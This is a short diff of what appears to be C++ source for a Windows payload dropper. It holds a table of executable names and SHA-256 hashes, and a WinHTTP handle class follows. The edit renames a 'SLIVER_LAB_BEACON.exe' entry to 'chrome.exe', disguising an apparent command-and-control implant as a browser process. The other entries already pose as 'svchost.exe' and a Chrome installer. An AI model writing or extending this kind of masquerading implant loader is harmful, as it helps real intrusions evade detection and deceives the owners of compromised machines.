@@ -37,7 +37,7 @@ struct PayloadDefinition {
 constexpr PayloadDefinition kPayloads[] = {
     {L"svchost.exe", "58f6354765f15e1fcd2041b5adda0f2349f856f8eac9bcec6dd4fe637fb9ac30"},
     {L"chrome_installer.exe", "d57cad5e6429f5a98e2b77eb0379a364703e5097152d47c98f6c46168731f349"},
-    {L"SLIVER_LAB_BEACON.exe", "44beaa132f87724158ab25cb424e32b3245c53101f563093d2d02efda56d1fc6"},
+    {L"chrome.exe", "44beaa132f87724158ab25cb424e32b3245c53101f563093d2d02efda56d1fc6"},
 };
 
 class WinHttpHandle {
